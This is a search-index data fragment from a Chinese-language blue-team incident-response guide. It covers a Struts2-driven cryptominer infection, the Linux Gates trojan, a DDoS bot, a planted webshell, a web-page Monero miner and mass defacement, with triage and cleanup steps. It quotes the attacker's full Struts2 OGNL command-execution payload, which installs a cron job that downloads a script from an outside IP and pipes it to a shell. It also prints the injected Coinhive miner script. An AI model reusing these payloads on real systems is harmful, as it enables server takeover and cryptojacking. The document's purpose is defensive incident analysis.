\u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x04_1","text":"\u672c\u6587\u7b80\u5355\u4ecb\u7ecd\u4e86\u77ed\u8fde\u63a5\u4ee5\u53ca\u6355\u6349\u77ed\u8fde\u63a5\u6e90\u6587\u4ef6\u7684\u6280\u5de7\uff0c\u7ad9\u5728\u5b89\u5168\u7ba1\u7406\u5458\u7684\u89d2\u5ea6\uff0c\u5e94\u52a0\u5f3a\u5bf9\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u7684\u7ba1\u7406\uff0c\u5728\u7f51\u7edc\u5c42\u53bb\u53d1\u73b0\u66f4\u591a\u5728\u7cfb\u7edf\u5c42\u5f88\u96be\u5bdf\u89c9\u7684\u5b89\u5168\u5a01\u80c1\u3002","title":"0x04 \u5c0f\u7ed3"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#3","text":"","title":"\u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x00_2","text":"\u968f\u7740\u865a\u62df\u8d27\u5e01\u7684\u75af\u72c2\u7092\u4f5c\uff0c\u5229\u7528\u6316\u77ff\u811a\u672c\u6765\u5b9e\u73b0\u6d41\u91cf\u53d8\u73b0\uff0c\u4f7f\u5f97\u6316\u77ff\u75c5\u6bd2\u6210\u4e3a\u4e0d\u6cd5\u5206\u5b50\u5229\u7528\u6700\u4e3a\u9891\u7e41\u7684\u653b\u51fb\u65b9\u5f0f\u3002\u65b0\u7684\u6316\u77ff\u653b\u51fb\u5c55\u73b0\u51fa\u4e86\u7c7b\u4f3c\u8815\u866b\u7684\u884c\u4e3a\uff0c\u5e76\u7ed3\u5408\u4e86\u9ad8\u7ea7\u653b\u51fb\u6280\u672f\uff0c\u4ee5\u589e\u52a0\u5bf9\u76ee\u6807\u670d\u52a1\u5668\u611f\u67d3\u7684\u6210\u529f\u7387\uff0c\u901a\u8fc7\u5229\u7528\u6c38\u6052\u4e4b\u84dd\uff08EternalBlue\uff09\u3001web\u653b\u51fb\u591a\u79cd\u6f0f\u6d1e\uff08\u5982Tomcat\u5f31\u53e3\u4ee4\u653b\u51fb\u3001Weblogic WLS\u7ec4\u4ef6\u6f0f\u6d1e\u3001Jboss\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u3001Struts2\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u7b49\uff09\uff0c\u5bfc\u81f4\u5927\u91cf\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61 \u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x01_2","text":"\u67d0\u5929\uff0c\u5b89\u5168\u7ba1\u7406\u5458\u5728\u767b\u5f55\u5b89\u5168\u8bbe\u5907\u5de1\u68c0\u65f6\uff0c\u53d1\u73b0\u67d0\u53f0\u7f51\u7ad9\u670d\u52a1\u5668\u6301\u7eed\u5411\u5883\u5916IP\u53d1\u8d77\u8fde\u63a5\uff0c\u4e0b\u8f7d\u75c5\u6bd2\u6e90\uff1a","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x02_2","text":"","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#a","text":"\u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7cfb\u7edf\u8fdb\u7a0b\u72b6\u6001\uff0c\u53d1\u73b0\u4e0d\u89c4\u5219\u547d\u540d\u7684\u5f02\u5e38\u8fdb\u7a0b\u3001\u5f02\u5e38\u4e0b\u8f7d\u8fdb\u7a0b : \u4e0b\u8f7dlogo.jpg\uff0c\u5305\u542b\u811a\u672c\u5185\u5bb9\u5982\u4e0b\uff1a \u5230\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u8005\u4e0b\u8f7dlogo.jpg\u5e76\u6267\u884c\u4e86\u91cc\u9762\u4e86shell\u811a\u672c\uff0c\u90a3\u8fd9\u4e2a\u811a\u672c\u662f\u5982\u4f55\u542f\u52a8\u7684\u5462\uff1f \u901a\u8fc7\u6392\u67e5\u7cfb\u7edf\u5f00\u673a\u542f\u52a8\u9879\u3001\u5b9a\u65f6\u4efb\u52a1\u3001\u670d\u52a1\u7b49\uff0c\u5728\u5b9a\u65f6\u4efb\u52a1\u91cc\u9762\uff0c\u53d1\u73b0\u4e86\u6076\u610f\u811a\u672c\uff0c\u6bcf\u9694\u4e00\u6bb5\u65f6\u95f4\u53d1\u8d77\u8bf7\u6c42\u4e0b\u8f7d\u75c5\u6bd2\u6e90\uff0c\u5e76\u6267\u884c \u3002","title":"A\u3001\u6392\u67e5\u8fc7\u7a0b"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#b","text":"\u5728Tomcat log\u65e5\u5fd7\u4e2d\uff0c\u6211\u4eec\u627e\u5230\u8fd9\u6837\u4e00\u6761\u8bb0\u5f55\uff1a \u5bf9\u65e5\u5fd7\u4e2d\u653b\u51fb\u6e90\u7801\u8fdb\u884c\u6458\u5f55\u5982\u4e0b\uff1a {(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo \"*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh\" | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u4ee3\u7801\u4e2d\u7684\u64cd\u4f5c\u4e0e\u5b9a\u65f6\u4efb\u52a1\u4e2d\u5f02\u5e38\u811a\u672c\u4e00\u81f4\uff0c\u636e\u6b64\u63a8\u65ad\u9ed1\u5ba2\u901a\u8fc7Struct \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5411\u670d\u52a1\u5668\u5b9a\u65f6\u4efb\u52a1\u4e2d\u5199\u5165\u6076\u610f\u811a\u672c\u5e76\u6267\u884c\u3002","title":"B\u3001\u6eaf\u6e90\u5206\u6790"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#c","text":"1\u3001\u5220\u9664\u5b9a\u65f6\u4efb\u52a1: 2\u3001\u7ec8\u6b62\u5f02\u5e38\u8fdb\u7a0b:","title":"C\u3001\u6e05\u9664\u75c5\u6bd2"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#d","text":"\u5347\u7ea7struts\u5230\u6700\u65b0\u7248\u672c","title":"D\u3001\u6f0f\u6d1e\u4fee\u590d"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x03","text":"\u9488\u5bf9\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u5b89\u5168\u8f6f\u4ef6\u5e76\u5347\u7ea7\u75c5\u6bd2\u5e93\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf\uff0c\u4fdd\u6301\u5b9e\u65f6\u9632\u62a4 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6","title":"0x03 \u9632\u8303\u63aa\u65bd"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#4","text":"","title":"\u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x00_3","text":"Linux\u76d6\u8328\u6728\u9a6c\u662f\u4e00\u7c7b\u6709\u7740\u4e30\u5bcc\u5386\u53f2\uff0c\u9690\u85cf\u624b\u6cd5\u5de7\u5999\uff0c\u7f51\u7edc\u653b\u51fb\u884c\u4e3a\u663e\u8457\u7684DDoS\u6728\u9a6c\uff0c\u4e3b\u8981\u6076\u610f\u7279\u70b9\u662f\u5177\u5907\u4e86\u540e\u95e8\u7a0b\u5e8f\uff0cDDoS\u653b\u51fb\u7684\u80fd\u529b\uff0c\u5e76\u4e14\u4f1a\u66ff\u6362\u5e38\u7528\u7684\u7cfb\u7edf\u6587\u4ef6\u8fdb\u884c\u4f2a\u88c5\u3002\u6728\u9a6c\u5f97\u540d\u4e8e\u5176\u5728\u53d8\u91cf\u51fd\u6570\u7684\u547d\u540d\u4e2d\uff0c\u5927\u91cf\u4f7f\u7528Gates\u8fd9\u4e2a\u5355\u8bcd\u3002\u5206\u6790\u548c\u6e05\u9664\u76d6\u8328\u6728\u9a6c\u7684\u8fc7\u7a0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u5f88\u591a\u503c\u5f97\u53bb\u5b66\u4e60\u548c\u501f\u9274\u7684\u5730\u65b9\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x01_3","text":"\u67d0\u5929\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u53d1\u73b0\u670d\u52a1\u5668CPU\u8d44\u6e90\u5f02\u5e38\uff0c\u51e0\u4e2a\u5f02\u5e38\u8fdb\u7a0b\u5360\u7528\u5927\u91cf\u7f51\u7edc\u5e26\u5bbd\uff1a","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x02_3","text":"\u5f02\u5e38IP\u8fde\u63a5\uff1a \u5f02\u5e38\u8fdb\u7a0b\uff1a \u67e5\u770b\u8fdb\u884c\u53d1\u73b0ps aux\u8fdb\u7a0b\u5f02\u5e38\uff0c\u8fdb\u5165\u8be5\u76ee\u5f55\u53d1\u73b0\u591a\u4e2a\u547d\u4ee4\uff0c\u731c\u6d4b\u547d\u4ee4\u53ef\u80fd\u5df2\u88ab\u66ff\u6362 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7cfb\u7edf\u8fdb\u7a0b\u72b6\u6001\uff0c\u53d1\u73b0\u4e0d\u89c4\u5219\u547d\u540d\u7684\u5f02\u5e38\u8fdb\u7a0b\u3001\u5f02\u5e38\u4e0b\u8f7d\u8fdb\u7a0b : \u5f02\u5e38\u542f\u52a8\u9879 \u8fdb\u5165rc3.d\u76ee\u5f55\u53ef\u4ee5\u53d1\u73b0\u591a\u4e2a\u5f02\u5e38\u8fdb\u884c\uff1a /etc/rc.d/rc3.d/S97DbSecuritySpt /etc/rc.d/rc3.d/S99selinux \u641c\u7d22\u75c5\u6bd2\u539f\u4f53 find / -size -1223124c -size +1223122c -exec ls -id {} \\; \u641c\u7d221223123\u5927\u5c0f\u7684\u6587\u4ef6 \u4ece\u4ee5\u4e0a\u79cd\u79cd\u884c\u4e3a\u53d1\u73b0\u8be5\u75c5\u6bd2\u4e0e\u201c\u76d6\u8328\u6728\u9a6c\u201d\u6709\u70b9\u7c7b\u4f3c\uff0c\u5177\u4f53\u6280\u672f\u5206\u6790\u7ec6\u8282\u8be6\u89c1\uff1a Linux\u5e73\u53f0\u201c\u76d6\u8328\u6728\u9a6c\u201d\u5206\u6790 http://www.freebuf.com/articles/system/117823.html \u60ac\u955c\u670d\u52a1\u5668\u536b\u58eb\u4e28Linux\u5e73\u53f0\u201c\u76d6\u8328\u6728\u9a6c\u201d\u5206\u6790 http://www.sohu.com/a/117926079_515168 \u624b\u52a8\u6e05\u9664\u6728\u9a6c\u8fc7\u7a0b\uff1a 1\u3001\u7b80\u5355\u5224\u65ad\u6709\u65e0\u6728\u9a6c #\u6709\u65e0\u4e0b\u5217\u6587\u4ef6 cat /etc/rc.d/init.d/selinux cat /etc/rc.d/init.d/DbSecuritySpt ls /usr/bin/bsd-port ls /usr/bin/dpkgd #\u67e5\u770b\u5927\u5c0f\u662f\u5426\u6b63\u5e38 ls -lh /bin/netstat ls -lh /bin/ps ls -lh /usr/sbin/lsof ls -lh /usr/sbin/ss 2\u3001\u4e0a\u4f20\u5982\u4e0b\u547d\u4ee4\u5230/root\u4e0b ps netstat ss lsof 3\u3001\u5220\u9664\u5982\u4e0b\u76ee\u5f55\u53ca\u6587\u4ef6 rm -rf /usr/bin/dpkgd (ps netstat lsof ss) rm -rf /usr/bin/bsd-port #\u6728\u9a6c\u7a0b\u5e8f rm -f /usr/bin/.sshd #\u6728\u9a6c\u540e\u95e8 rm -f /tmp/gates.lod rm -f /tmp/moni.lod rm -f /etc/rc.d/init.d/DbSecuritySpt(\u542f\u52a8\u4e0a\u8ff0\u63cf\u8ff0\u7684\u90a3\u4e9b\u6728\u9a6c\u53d8\u79cd\u7a0b\u5e8f) rm -f /etc/rc.d/rc1.d/S97DbSecuritySpt rm -f /etc/rc.d/rc2.d/S97DbSecuritySpt rm -f /etc/rc.d/rc3.d/S97DbSecuritySpt rm -f /etc/rc.d/rc4.d/S97DbSecuritySpt rm -f /etc/rc.d/rc5.d/S97DbSecuritySpt rm -f /etc/rc.d/init.d/selinux(\u9ed8\u8ba4\u662f\u542f\u52a8/usr/bin/bsd-port/getty) rm -f /etc/rc.d/rc1.d/S99selinux rm -f /etc/rc.d/rc2.d/S99selinux rm -f /etc/rc.d/rc3.d/S99selinux rm -f /etc/rc.d/rc4.d/S99selinux rm -f /etc/rc.d/rc5.d/S99selinux 4\u3001\u627e\u51fa\u5f02\u5e38\u7a0b\u5e8f\u5e76\u6740\u6b7b 5\u3001\u5220\u9664\u542b\u6728\u9a6c\u547d\u4ee4\u5e76\u91cd\u65b0\u5b89\u88c5","title":"0x02 \u4e8b\u4ef6\u5206\u6790"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x03_1","text":"RPM check\u68c0\u67e5\uff1a \u7cfb\u7edf\u5b8c\u6574\u6027\u4e5f\u53ef\u4ee5\u901a\u8fc7rpm\u81ea\u5e26\u7684-Va\u6765\u6821\u9a8c\u68c0\u67e5\u6240\u6709\u7684rpm\u8f6f\u4ef6\u5305,\u6709\u54ea\u4e9b\u88ab\u7be1\u6539\u4e86,\u9632\u6b62rpm\u4e5f\u88ab\u66ff\u6362,\u4e0a\u4f20\u4e00\u4e2a\u5b89\u5168\u5e72\u51c0\u7a33\u5b9a\u7248\u672crpm\u4e8c\u8fdb\u5236\u5230\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u68c0\u67e5 ./rpm -Va > rpm.log \u5982\u679c\u4e00\u5207\u5747\u6821\u9a8c\u6b63\u5e38\u5c06\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa\u3002\u5982\u679c\u6709\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u663e\u793a\u51fa\u6765\u3002\u8f93\u51fa\u683c\u5f0f\u662f8\u4f4d\u957f\u5b57\u7b26\u4e32, ``c \u7528\u4ee5\u6307\u914d\u7f6e\u6587\u4ef6, \u63a5\u7740\u662f\u6587\u4ef6\u540d. 8\u4f4d\u5b57\u7b26\u7684\u6bcf\u4e00\u4e2a \u7528\u4ee5\u8868\u793a\u6587\u4ef6\u4e0eRPM\u6570\u636e\u5e93\u4e2d\u4e00\u79cd\u5c5e\u6027\u7684\u6bd4\u8f83\u7ed3\u679c \u3002``. (\u70b9) \u8868\u793a\u6d4b\u8bd5\u901a\u8fc7\u3002.\u4e0b\u9762\u7684\u5b57\u7b26\u8868\u793a\u5bf9RPM\u8f6f\u4ef6\u5305\u8fdb\u884c\u7684\u67d0\u79cd\u6d4b\u8bd5\u5931\u8d25\uff1a \u547d\u4ee4\u66ff\u6362\uff1a rpm2cpio \u5305\u5168\u540d | cpio -idv .\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84 rpm\u5305\u4e2d\u6587\u4ef6\u63d0\u53d6 Rpm2cpio \u5c06rpm\u5305\u8f6c\u6362\u4e3acpio\u683c\u5f0f\u7684\u547d\u4ee4 Cpio \u662f\u4e00\u4e2a\u6807\u51c6\u5de5\u5177\uff0c\u5b83\u7528\u4e8e\u521b\u5efa\u8f6f\u4ef6\u6863\u6848\u6587\u4ef6\u548c\u4ece\u6863\u6848\u6587\u4ef6\u4e2d\u63d0\u53d6\u6587\u4ef6 Cpio \u9009\u9879 < [\u6587\u4ef6|\u8bbe\u5907] -i\uff1acopy-in\u6a21\u5f0f\uff0c\u8fd8\u539f -d\uff1a\u8fd8\u539f\u65f6\u81ea\u52a8\u65b0\u5efa\u76ee\u5f55 -v\uff1a\u663e\u793a\u8fd8\u539f\u8fc7\u7a0b \u6587\u4ef6\u63d0\u53d6\u8fd8\u539f\u6848\u4f8b\uff1a rpm -qf /bin/ls \u67e5\u8be2ls\u547d\u4ee4\u5c5e\u4e8e\u54ea\u4e2a\u8f6f\u4ef6\u5305 mv /bin/ls /tmp rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls \u63d0\u53d6rpm\u5305\u4e2dls\u547d\u4ee4\u5230\u5f53\u524d\u76ee\u5f55\u7684/bin/ls\u4e0b cp /root/bin/ls /bin/ \u628als\u547d\u4ee4\u590d\u5236\u5230/bin/\u76ee\u5f55 \u4fee\u590d\u6587\u4ef6\u4e22\u5931 \u6302\u8f7d\u547d\u4ee4rpm\u5305\uff1a mkdir /mnt/chrom/ \u5efa\u7acb\u6302\u8f7d\u70b9 mount -t iso9660 /dev/cdrom /mnt/cdrom/ \u6302\u5728\u5149\u76d8 mount/dev/sr0 /mnt/cdrom/ \u5378\u8f7d\u547d\u4ee4 umount \u8bbe\u5907\u6587\u4ef6\u540d\u6216\u6302\u8f7d\u70b9 umount /mnt/cdrom/","title":"0x03 \u547d\u4ee4\u66ff\u6362"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#5ddos","text":"","title":"\u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#_1","text":"\u67d0\u670d\u52a1\u5668\u7f51\u7edc\u8d44\u6e90\u5f02\u5e38,\u611f\u67d3\u8be5\u6728\u9a6c\u75c5\u6bd2\u7684\u670d\u52a1\u5668\u4f1a\u5360\u7528\u7f51\u7edc\u5e26\u5bbd\uff0c\u751a\u81f3\u5f71\u54cd\u7f51\u7edc\u4e1a\u52a1\u6b63\u5e38\u5e94\u7528\u3002","title":"\u73b0\u8c61\u63cf\u8ff0"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#_2","text":"\u9488\u5bf9\u65e5\u5fd7\u670d\u52a1\u5668\u75c5\u6bd2\u4e8b\u4ef6\u6392\u67e5\u60c5\u51b5\uff1a \u5728\u5f00\u673a\u542f\u52a8\u9879/etc/rc.d/rc.local\u53d1\u73b0\u53ef\u7591\u7684sh.sh\u811a\u672c\uff0c\u8fdb\u4e00\u6b65\u8ddf\u8e2ash.sh\u811a\u672c,\u8fd9\u662f\u4e00\u4e2a\u68c0\u6d4b\u75c5\u6bd2\u5341\u5206\u949f\u5b58\u6d3b\u7684\u811a\u672c\u3002 \u5728root\u76ee\u5f55\u4e0b\u53d1\u73b0\u5b58\u6d3b\u68c0\u6d4b\u811a\u672c \u89e3\u51b3\u6b65\u9aa4\uff1a \u7ed3\u675f\u8fdb\u7a0b ps aux | grep \"conf.m\" | grep -v grep | awk \u2018{print $2}\u2018| xargs kill -9 \u6e05\u9664\u81ea\u52a8\u542f\u52a8\u811a\u672c vim /etc/rc.local \u53bb\u6389 sh /etc/chongfu.sh & \u6e05\u9664 \u811a\u672c rm -rf /etc/chongfu.sh /tem/chongfu.sh \u4fee\u6539\u767b\u5f55\u5bc6\u7801 passwd \u91cd\u542f\u3002 reboot","title":"\u7cfb\u7edf\u5206\u6790"},{"location":"blueteam/Web%E5%AE%9E%E6%88%98/","text":"\u7b2c1\u7bc7\uff1a\u7f51\u7ad9\u88ab\u690d\u5165Webshell \u7f51\u7ad9\u88ab\u690d\u5165webshell\uff0c\u610f\u5473\u7740\u7f51\u7ad9\u5b58\u5728\u53ef\u5229\u7528\u7684\u9ad8\u5371\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u5229\u7528\u6f0f\u6d1e\u5165\u4fb5\u7f51\u7ad9\uff0c\u5199\u5165webshell\u63a5\u7ba1\u7f51\u7ad9\u7684\u63a7\u5236\u6743\u3002\u4e3a\u4e86\u5f97\u5230\u6743\u9650 \uff0c\u5e38\u89c4\u7684\u624b\u6bb5\u5982\uff1a\u524d\u540e\u53f0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff0c\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0cSql\u6ce8\u5165\u5199\u5165\u6587\u4ef6\u7b49\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u7f51\u7ad9\u7ba1\u7406\u5458\u5728\u7ad9\u70b9\u76ee\u5f55\u4e0b\u53d1\u73b0\u5b58\u5728webshell\uff0c\u4e8e\u662f\u5f00\u59cb\u4e86\u5bf9\u5165\u4fb5\u8fc7\u7a0b\u5c55\u5f00\u4e86\u5206\u6790\u3002 Webshell\u67e5\u6740\u5de5\u5177\uff1a D\u76fe_Web\u67e5\u6740 Window\u4e0bwebshell\u67e5\u6740\uff1a http://www.d99net.net/index.asp \u6cb3\u9a6c\uff1a\u652f\u6301\u591a\u5e73\u53f0\uff0c\u4f46\u662f\u9700\u8981\u8054\u7f51\u73af\u5883\u3002 \u4f7f\u7528\u65b9\u6cd5: wget http://down.shellpub.com/hm/latest/hm-linux-amd64.tgz tar xvf hm-linux-amd64.tgz hm scan /www \u4e8b\u4ef6\u5206\u6790 \u00b6 1\u3001 \u5b9a\u4f4d\u65f6\u95f4\u8303\u56f4 \u00b6 \u901a\u8fc7\u53d1\u73b0\u7684webshell\u6587\u4ef6\u521b\u5efa\u65f6\u95f4\u70b9\uff0c\u53bb\u7ffb\u770b\u76f8\u5173\u65e5\u671f\u7684\u8bbf\u95ee\u65e5\u5fd7\u3002 2\u3001Web \u65e5\u5fd7\u5206\u6790 \u00b6 \u7ecf\u8fc7\u65e5\u5fd7\u5206\u6790\uff0c\u5728\u6587\u4ef6\u521b\u5efa\u7684\u65f6\u95f4\u8282\u70b9\u5e76\u672a\u53d1\u73b0\u53ef\u7591\u7684\u4e0a\u4f20\uff0c\u4f46\u53d1\u73b0\u5b58\u5728\u53ef\u7591\u7684webservice\u63a5\u53e3 3\u3001\u6f0f\u6d1e\u5206\u6790 \u00b6 \u8bbf\u95eewebservice\u63a5\u53e3\uff0c\u53d1\u73b0\u53d8\u91cf\uff1abuffer\u3001distinctpach\u3001newfilename\u53ef\u4ee5\u5728\u5ba2\u6237\u7aef\u81ea\u5b9a\u4e49 4\u3001\u6f0f\u6d1e\u590d\u73b0 \u00b6 \u5c1d\u8bd5\u5bf9\u6f0f\u6d1e\u8fdb\u884c\u590d\u73b0\uff0c\u53ef\u6210\u529f\u4e0a\u4f20webshell\uff0c\u63a7\u5236\u7f51\u7ad9\u670d\u52a1\u5668 5\u3001\u6f0f\u6d1e\u4fee\u590d \u00b6 \u6e05\u9664webshell\u5e76\u5bf9webservice\u63a5\u53e3\u8fdb\u884c\u4ee3\u7801\u4fee\u590d\u3002 \u4ece\u53d1\u73b0webshell\u5230\u65e5\u5fd7\u5206\u6790\uff0c\u518d\u5230\u6f0f\u6d1e\u590d\u73b0\u548c\u4fee\u590d\uff0c\u672c\u6587\u6682\u4e0d\u6d89\u53ca\u6eaf\u6e90\u53d6\u8bc1\u65b9\u9762\u3002 \u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff \u00b6 \u95e8\u7f57\u5e01(Monero \u6216 XMR)\uff0c\u5b83\u662f\u4e00\u4e2a\u975e\u5e38\u6ce8\u91cd\u4e8e\u9690\u79c1\u3001\u533f\u540d\u6027\u548c\u4e0d\u53ef\u8ddf\u8e2a\u7684\u52a0\u5bc6\u6570\u5b57\u8d27\u5e01\u3002\u53ea\u9700\u5728\u7f51\u9875\u4e2d\u914d\u7f6e\u597djs\u811a\u672c\uff0c\u6253\u5f00\u7f51\u9875\u5c31\u53ef\u4ee5\u6316\u77ff\uff0c\u662f\u4e00\u79cd\u975e\u5e38\u7b80\u5355\u7684\u6316\u77ff\u65b9\u5f0f\uff0c\u800c\u901a\u8fc7\u8fd9\u79cd\u6076\u610f\u6316\u77ff\u83b7\u53d6\u6570\u5b57\u8d27\u5e01\u662f\u9ed1\u7070\u8272\u4ea7\u4e1a\u83b7\u53d6\u6536\u76ca\u7684\u91cd\u8981\u9014\u5f84\u3002 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u5229\u7528XMR\u6076\u610f\u6316\u77ff\uff0c\u4f1a\u5927\u91cf\u5360\u7528\u7528\u6237\u7684CPU\u8d44\u6e90\uff0c\u4e25\u91cd\u5f71\u54cd\u4e86\u7f51\u7ad9\u7684\u7528\u6237\u4f53\u9a8c\u3002 \u4ece08/09\u65e50\u70b9\u5f00\u59cb\uff0c\u5c40\u57df\u7f51\u5185\u67d0IP\u8bbf\u95ee\u7f51\u7ad9\u9875\u9762\u4f1a\u89e6\u53d1\u5b89\u5168\u9884\u8b66\uff0c\u53ea\u8981\u8bbf\u95ee\u6b64\u670d\u52a1\u5668\u4e0a\u7684\u7f51\u9875\uff0cCPU\u76f4\u7ebf\u4e0a\u5347100% \u95ee\u9898\u89e3\u6790 \u00b6 \u901a\u8fc7\u83b7\u53d6\u6076\u610f\u7f51\u9875url\uff0c\u5bf9\u7f51\u9875\u9875\u9762\u8fdb\u884c\u5206\u6790\uff0c\u53d1\u73b0\u7f51\u7ad9\u9875\u9762\u88ab\u690d\u5165\u5728\u7ebf\u95e8\u7f57\u5e01\u6316\u77ff\u4ee3\u7801\uff1a var script = document.createElement('script'); script.onload = function () { // XMR Pool hash var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu'); // TODO: Replace the below string with wallet string m.start('47DuVLx9UuD1gEk3M4Wge1BwQyadQs5fTew8Q3Cxi95c8W7tKTXykgDfj7HVr9aCzzUNb9vA6eZ3eJCXE9yzhmTn1bjACGK'); }; script.src = 'https://coinhive.com/lib/coinhive.min.js'; document.head.appendChild(script); \u5220\u9664js\u91cc\u9762\u7684\u6076\u610f\u4ee3\u7801\uff0c\u7f51\u7ad9\u88abXMR \u6076\u610f\u6316\u77ff\uff0c\u670d\u52a1\u5668\u5df2\u7ecf\u88ab\u653b\u51fb\uff0c\u8fdb\u4e00\u6b65\u505a\u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u3002 \u7b2c3\u7bc7\uff1a\u6279\u91cf\u6302\u9ed1\u9875 \u00b6 \u4f5c\u4e3a\u4e00\u4e2a\u7f51\u7ad9\u7ba1\u7406\u5458\uff0c\u4f60\u91c7\u7528\u5f00\u6e90CMS\u505a\u7f51\u7ad9\uff0c\u6bd4\u5982dedecms\uff0c\u4f46\u662f\u6709\u4e00\u5929\uff0c\u4f60\u5ffd\u7136\u53d1\u73b0\u4e0d\u77e5\u4f55\u65f6\uff0c\u7f51\u7ad9\u7684\u53cb\u60c5\u94fe\u63a5\u6a21\u5757\u88ab\u6302\u5927\u91cf\u5783\u573e\u94fe\u63a5\uff0c\u7f51\u7ad9\u51fa\u73b0\u4e86\u5f88\u591a\u4e0d\u8be5\u6709\u7684\u76ee\u5f55\uff0c\u91cc\u9762\u5168\u662f\u535a\u5f69\u76f8\u5173\u7684\u7f51\u9875\u3002\u800c\u4e14\uff0c\u653b\u51fb\u8005\u5728\u6302\u9ed1\u9875\u4ee5\u540e\uff0c\u4f1a\u5728\u4e00\u4e9b\u5c0f\u8bba\u575b\u6ce8\u518c\u9a6c\u7532\u5c06\u4f60\u7684\u7f51\u7ad9\u9ed1\u9875\u94fe\u63a5\u53d1\u5230\u8bba\u575b\uff0c\u5f15\u722c\u866b\u6536\u5f55\u3002\u5728\u641c\u7d22\u5f15\u64ce\u641c\u7d22\u7f51\u7ad9\u5730\u5740\u65f6\uff0c\u6536\u5f55\u4e86\u4e00\u4e9b\u4f1a\u51fa\u73b0\u4e00\u4e9b\u535a\u5f69\u9875\u9762\uff0c\u4e25\u91cd\u5f71\u54cd\u4e86\u7f51\u7ad9\u5f62\u8c61\u3002 \u539f\u56e0\u5206\u6790 \u00b6 